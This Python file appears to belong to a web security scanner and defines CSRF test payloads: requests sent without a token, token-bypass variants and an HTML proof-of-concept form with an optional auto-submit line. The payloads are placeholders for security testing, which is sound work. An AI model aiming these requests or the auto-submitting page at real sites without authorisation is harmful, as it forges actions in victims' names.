"""
CSRF (Cross-Site Request Forgery) payloads
"""

class CSRFPayloads:
    """CSRF payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic CSRF test payloads"""
        return [
            # Simple form submission without CSRF token
            {
                'name': 'basic_post',
                'method': 'POST',
                'data': {'action': 'test', 'value': 'csrf_test'},
                'description': 'Basic POST request without CSRF token'
            },
            # PUT request
            {
                'name': 'put_request',
                'method': 'PUT',
                'data': {'action': 'update', 'value': 'csrf_test'},
                'description': 'PUT request without CSRF token'
            },
            # DELETE request
            {
                'name': 'delete_request',
                'method': 'DELETE',
                'data': {'action': 'delete', 'id': '1'},
                'description': 'DELETE request without CSRF token'
            },
            # PATCH request
            {
                'name': 'patch_request',
                'method': 'PATCH',
                'data': {'action': 'patch', 'value': 'csrf_test'},
                'description': 'PATCH request without CSRF token'
            }
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced CSRF test payloads"""
        return [
            # JSON content type
            {
                'name': 'json_post',
                'method': 'POST',
                'data': '{"action": "test", "value": "csrf_test"}',
                'headers': {'Content-Type': 'application/json'},
                'description': 'JSON POST request without CSRF token'
            },
            # XML content type
            {
                'name': 'xml_post',
                'method': 'POST',
                'data': '<?xml version="1.0"?><request><action>test</action></request>',
                'headers': {'Content-Type': 'application/xml'},
                'description': 'XML POST request without CSRF token'
            },
            # Multipart form data
            {
                'name': 'multipart_post',
                'method': 'POST',
                'data': {'action': 'upload', 'file': 'test.txt'},
                'headers': {'Content-Type': 'multipart/form-data'},
                'description': 'Multipart form POST without CSRF token'
            },
            # Custom headers
            {
                'name': 'custom_headers',
                'method': 'POST',
                'data': {'action': 'test'},
                'headers': {
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Custom-Header': 'test'
                },
                'description': 'POST with custom headers without CSRF token'
            }
        ]
    
    @staticmethod
    def get_bypass_payloads():
        """Get CSRF protection bypass payloads"""
        return [
            # Empty CSRF token
            {
                'name': 'empty_token',
                'method': 'POST',
                'data': {'csrf_token': '', 'action': 'test'},
                'description': 'POST with empty CSRF token'
            },
            # Invalid CSRF token
            {
                'name': 'invalid_token',
                'method': 'POST',
                'data': {'csrf_token': 'invalid_token_123', 'action': 'test'},
                'description': 'POST with invalid CSRF token'
            },
            # Wrong parameter name
            {
                'name': 'wrong_param',
                'method': 'POST',
                'data': {'_token': 'test123', 'action': 'test'},
                'description': 'POST with wrong CSRF parameter name'
            },
            # Case sensitivity test
            {
                'name': 'case_test',
                'method': 'POST',
                'data': {'CSRF_TOKEN': 'test123', 'action': 'test'},
                'description': 'POST with uppercase CSRF token parameter'
            },
            # Double submit with different values
            {
                'name': 'double_submit',
                'method': 'POST',
                'data': {'csrf_token': 'token1', '_token': 'token2', 'action': 'test'},
                'description': 'POST with multiple different CSRF tokens'
            }
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all CSRF payloads"""
        payloads = []
        payloads.extend(CSRFPayloads.get_basic_payloads())
        payloads.extend(CSRFPayloads.get_advanced_payloads())
        payloads.extend(CSRFPayloads.get_bypass_payloads())
        return payloads
    
    @staticmethod
    def get_html_poc_template():
        """Get HTML proof of concept template for CSRF"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page demonstrates a potential CSRF vulnerability.</p>
    
    <form action="{target_url}" method="POST" id="csrf-form">
        {form_fields}
        <input type="submit" value="Submit Request">
    </form>
    
    <script>
        // Auto-submit form (optional)
        // document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
        '''
